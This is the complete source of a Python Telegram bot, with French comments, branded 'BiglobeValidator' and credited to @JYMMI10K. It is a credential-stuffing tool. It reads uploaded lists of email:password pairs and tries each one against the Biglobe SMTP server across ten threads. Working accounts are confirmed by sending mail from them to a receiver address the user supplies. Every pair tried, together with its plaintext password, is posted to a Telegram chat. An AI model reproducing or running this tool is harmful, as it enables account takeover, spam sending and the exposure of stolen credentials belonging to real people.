import smtplib
import ssl
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from datetime import datetime
from dotenv import load_dotenv

# Chargement des variables d'environnement
load_dotenv()

# === Configuration par défaut ===
THREADS = 10
SMTP_SERVER = "mail.biglobe.ne.jp"
SMTP_PORT = 587
DELAY_BETWEEN_CHECKS = 30  # secondes entre chaque tentative

# === Configuration Telegram ===
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')

# === Global state ===
valid_lock = threading.Lock()
print_lock = threading.Lock()
valid_results = []
remaining = 0
telegram_bot = None
total_combos = 0
start_time = None
last_stats_time = 0
STATS_INTERVAL = 60  # Envoyer les stats toutes les 60 secondes

# État du bot
bot_state = {
    'waiting_for_list': False,
    'waiting_for_output': False,
    'waiting_for_email': False,
    'input_file': '',
    'output_file': '',
    'receiver_email': '',
    'combos': [],
    'is_running': False,
    'last_valid': None,
    'valid_count': 0,
    'invalid_count': 0
}


def banner():
    print(r"""
  ____  _       _ _           _           
 | __ )(_) __ _(_) | ___  ___| |_ ___ _ __ 
 |  _ \| |/ _` | | |/ _ \/ __| __/ _ \ '__|
 | |_) | | (_| | | |  __/\__ \ ||  __/ |   
 |____/|_|\__, |_|_|\___||___/\__\___|_|   
          |___/         BiglobeValidator v1.0
    """)


def send_test_mail(email, password, receiver):
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10) as server:
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(email, password)

            message = (
                f"From: {email}\r\n"
                f"To: {receiver}\r\n"
                f"Subject: +1 BIGLOBE\r\n\r\n"
                f"Connexion SMTP réussie : {email}"
            )
            server.sendmail(email, receiver, message)
            return True

    except smtplib.SMTPAuthenticationError:
        return False

    except (smtplib.SMTPServerDisconnected, smtplib.SMTPException) as e:
        with print_lock:
            print(f"[!] Erreur SMTP ({email}): {e}")
        return False

    except Exception as e:
        with print_lock:
            print(f"[!] Erreur inconnue ({email}): {e}")
        return False


def send_telegram_message(message):
    global telegram_bot
    if not telegram_bot:
        telegram_bot = Bot(token=TELEGRAM_BOT_TOKEN)
    try:
        telegram_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
    except Exception as e:
        print(f"[!] Erreur Telegram: {e}")


def send_stats():
    global last_stats_time, start_time
    current_time = time.time()
    
    if current_time - last_stats_time >= STATS_INTERVAL:
        elapsed_time = current_time - start_time
        processed = total_combos - remaining
        valid_count = len(valid_results)
        speed = processed / elapsed_time if elapsed_time > 0 else 0
        
        stats_message = f"""
📊 STATISTIQUES EN DIRECT 📊
━━━━━━━━━━━━━━━━━━━━
⏱️ Temps écoulé: {int(elapsed_time/60)}m {int(elapsed_time%60)}s
📈 Progression: {processed}/{total_combos} ({int((processed/total_combos)*100)}%)
✅ Valides: {valid_count}
🚀 Vitesse: {speed:.2f} combos/min
⏳ Temps estimé restant: {int((remaining/speed)/60)}m {int((remaining/speed)%60)}s
━━━━━━━━━━━━━━━━━━━━
💻 By @JYMMI10K
"""
        send_telegram_message(stats_message)
        last_stats_time = current_time


def process_combo(combo, receiver):
    global remaining
    email, password = combo.split(":", 1)
    is_valid = send_test_mail(email, password, receiver)

    with print_lock:
        status = "✅ VALID" if is_valid else "❌ INVALID"
        if is_valid:
            bot_state['valid_count'] += 1
            bot_state['last_valid'] = combo
        else:
            bot_state['invalid_count'] += 1

        message = f"""
🔰 BIGLOBE VALIDATOR 🔰
━━━━━━━━━━━━━━━━━━━━
📧 Email: {email}
🔑 Password: {password}
📊 Status: {status}
📈 Restants: {remaining - 1}
━━━━━━━━━━━━━━━━━━━━
💻 By @JYMMI10K
"""
        print(f"{status} {email}   | Restants : {remaining - 1}")
        send_telegram_message(message)
        send_stats()  # Envoie les stats après chaque résultat

    if is_valid:
        with valid_lock:
            valid_results.append(combo)

    remaining -= 1
    time.sleep(DELAY_BETWEEN_CHECKS)


def load_combos(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if ":" in line]


def save_valid_results(filepath, results):
    try:
        with open(filepath, "w") as f:
            f.writelines(result + "\n" for result in results)
    except Exception as e:
        print(f"[!] Erreur lors de la sauvegarde des résultats : {e}")
        return False
    return True


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("📤 Envoyer Liste", callback_data='send_list'),
            InlineKeyboardButton("📊 Statut", callback_data='status')
        ],
        [
            InlineKeyboardButton("❌ Arrêter", callback_data='stop'),
            InlineKeyboardButton("ℹ️ Aide", callback_data='help')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text("""
🔰 Bienvenue sur Biglobe Validator 🔰

Utilisez les boutons ci-dessous ou les commandes :
/start - Afficher ce menu
/list - Envoyer votre fichier de combos
/status - Voir l'état actuel
/stop - Arrêter la validation
/help - Afficher l'aide
/stats - Voir les statistiques

💻 By @JYMMI10K
""", reply_markup=reply_markup)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'send_list':
        await handle_list(update, context)
    elif query.data == 'status':
        await status(update, context)
    elif query.data == 'stop':
        await stop(update, context)
    elif query.data == 'help':
        await help_command(update, context)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
📖 GUIDE D'UTILISATION 📖
━━━━━━━━━━━━━━━━━━━━
1️⃣ Envoyez votre fichier de combos avec /list
2️⃣ Donnez le nom du fichier de sortie
3️⃣ Fournissez l'email de réception
4️⃣ La validation commence automatiquement

📊 Commandes disponibles :
/start - Menu principal
/list - Envoyer liste
/status - Voir statut
/stop - Arrêter
/stats - Statistiques
/help - Ce guide

⚠️ Remarques :
- Format des combos : email:password
- Un combo par ligne
- Délai entre tests : 30s
- Threads actifs : 10

💻 By @JYMMI10K
"""
    await update.message.reply_text(help_text)


async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_state['is_running']:
        stats_message = f"""
📈 STATISTIQUES DÉTAILLÉES 📈
━━━━━━━━━━━━━━━━━━━━
✅ Valides: {bot_state['valid_count']}
❌ Invalides: {bot_state['invalid_count']}
📊 Total: {bot_state['valid_count'] + bot_state['invalid_count']}
🎯 Taux de réussite: {int((bot_state['valid_count']/(bot_state['valid_count'] + bot_state['invalid_count']))*100)}%
⏱️ Temps écoulé: {int((time.time() - start_time)/60)}m {int((time.time() - start_time)%60)}s
━━━━━━━━━━━━━━━━━━━━
💻 By @JYMMI10K
"""
        await update.message.reply_text(stats_message)
    else:
        await update.message.reply_text("⚠️ Aucune validation en cours")


async def handle_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        await file.download_to_drive('combos.txt')
        bot_state['input_file'] = 'combos.txt'
        bot_state['waiting_for_output'] = True
        
        keyboard = [[InlineKeyboardButton("❌ Annuler", callback_data='cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "📂 Fichier reçu !\nMaintenant, envoyez le nom du fichier de sortie (ex: valides.txt)",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text("❌ Veuillez envoyer un fichier texte contenant les combos")


async def handle_output(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot_state['output_file'] = update.message.text
    bot_state['waiting_for_email'] = True
    
    keyboard = [[InlineKeyboardButton("❌ Annuler", callback_data='cancel')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📧 Envoyez maintenant l'email de réception pour les tests",
        reply_markup=reply_markup
    )


async def handle_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot_state['receiver_email'] = update.message.text
    bot_state['is_running'] = True
    bot_state['valid_count'] = 0
    bot_state['invalid_count'] = 0
    
    keyboard = [
        [
            InlineKeyboardButton("📊 Statut", callback_data='status'),
            InlineKeyboardButton("❌ Arrêter", callback_data='stop')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "✅ Configuration terminée !\nLa validation va commencer...",
        reply_markup=reply_markup
    )
    await start_validation(update, context)


async def start_validation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global remaining, total_combos, start_time, last_stats_time
    
    try:
        combos = load_combos(bot_state['input_file'])
        if not combos:
            await update.message.reply_text("❌ Aucune combinaison valide trouvée dans le fichier")
            return

        total_combos = len(combos)
        remaining = total_combos
        start_time = time.time()
        last_stats_time = start_time

        # Message de démarrage
        start_message = f"""
🚀 DÉMARRAGE DE LA VALIDATION 🚀
━━━━━━━━━━━━━━━━━━━━
📂 Fichier: {bot_state['input_file']}
📊 Total combos: {total_combos}
⏱️ Délai entre tests: {DELAY_BETWEEN_CHECKS}s
👥 Threads: {THREADS}
━━━━━━━━━━━━━━━━━━━━
💻 By @JYMMI10K
"""
        await update.message.reply_text(start_message)

        # Démarrer la validation dans un thread séparé
        threading.Thread(target=run_validation, args=(combos, bot_state['receiver_email'], bot_state['output_file'], update, context)).start()

    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")


def run_validation(combos, receiver, output_file, update, context):
    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(process_combo, combo, receiver) for combo in combos]
            for _ in as_completed(futures):
                pass

        if save_valid_results(output_file, valid_results):
            end_message = f"""
🏁 VALIDATION TERMINÉE 🏁
━━━━━━━━━━━━━━━━━━━━
📊 Total traité: {total_combos}
✅ Valides: {len(valid_results)}
⏱️ Temps total: {int((time.time() - start_time)/60)}m {int((time.time() - start_time)%60)}s
📂 Résultats sauvegardés: {output_file}
━━━━━━━━━━━━━━━━━━━━
💻 By @JYMMI10K
"""
            context.bot.send_message(chat_id=update.effective_chat.id, text=end_message)
            
            # Réinitialisation de l'état du bot
            bot_state.update({
                'waiting_for_list': False,
                'waiting_for_output': False,
                'waiting_for_email': False,
                'input_file': '',
                'output_file': '',
                'receiver_email': '',
                'combos': [],
                'is_running': False,
                'last_valid': None,
                'valid_count': 0,
                'invalid_count': 0
            })
            
            # Nettoyage des résultats
            valid_results.clear()
            
            # Message d'attente pour nouvelle requête
            keyboard = [
                [
                    InlineKeyboardButton("📤 Nouvelle Validation", callback_data='send_list'),
                    InlineKeyboardButton("📊 Statut", callback_data='status')
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="✅ Validation terminée !\nEnvoyez /start pour commencer une nouvelle validation",
                reply_markup=reply_markup
            )
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Erreur lors de la sauvegarde des résultats")

    except Exception as e:
        context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Erreur lors de la validation: {str(e)}")
        
        # Réinitialisation de l'état en cas d'erreur
        bot_state.update({
            'waiting_for_list': False,
            'waiting_for_output': False,
            'waiting_for_email': False,
            'input_file': '',
            'output_file': '',
            'receiver_email': '',
            'combos': [],
            'is_running': False,
            'last_valid': None,
            'valid_count': 0,
            'invalid_count': 0
        })
        valid_results.clear()
        
        keyboard = [
            [
                InlineKeyboardButton("📤 Nouvelle Validation", callback_data='send_list'),
                InlineKeyboardButton("📊 Statut", callback_data='status')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Une erreur est survenue.\nEnvoyez /start pour recommencer",
            reply_markup=reply_markup
        )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_state['waiting_for_output']:
        await handle_output(update, context)
    elif bot_state['waiting_for_email']:
        await handle_email(update, context)
    else:
        await update.message.reply_text("❌ Commande non reconnue. Utilisez /start pour voir les commandes disponibles")


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if remaining > 0:
        elapsed_time = time.time() - start_time
        processed = total_combos - remaining
        valid_count = len(valid_results)
        speed = processed / elapsed_time if elapsed_time > 0 else 0
        
        status_message = f"""
📊 STATUT ACTUEL 📊
━━━━━━━━━━━━━━━━━━━━
⏱️ Temps écoulé: {int(elapsed_time/60)}m {int(elapsed_time%60)}s
📈 Progression: {processed}/{total_combos} ({int((processed/total_combos)*100)}%)
✅ Valides: {valid_count}
🚀 Vitesse: {speed:.2f} combos/min
⏳ Temps estimé restant: {int((remaining/speed)/60)}m {int((remaining/speed)%60)}s
━━━━━━━━━━━━━━━━━━━━
💻 By @JYMMI10K
"""
        await update.message.reply_text(status_message)
    else:
        await update.message.reply_text("⚠️ Aucune validation en cours")


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global remaining
    remaining = 0
    await update.message.reply_text("🛑 Validation arrêtée")


def main():
    # Configuration du bot
    application = Application.builder().token(os.getenv('TELEGRAM_BOT_TOKEN')).build()

    # Ajout des handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("list", handle_list))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.TEXT, handle_list))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Démarrage du bot
    print("🤖 Bot démarré...")
    application.run_polling()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[x] S/O Sorcier 未来の日本の王 - merci d'avoir use")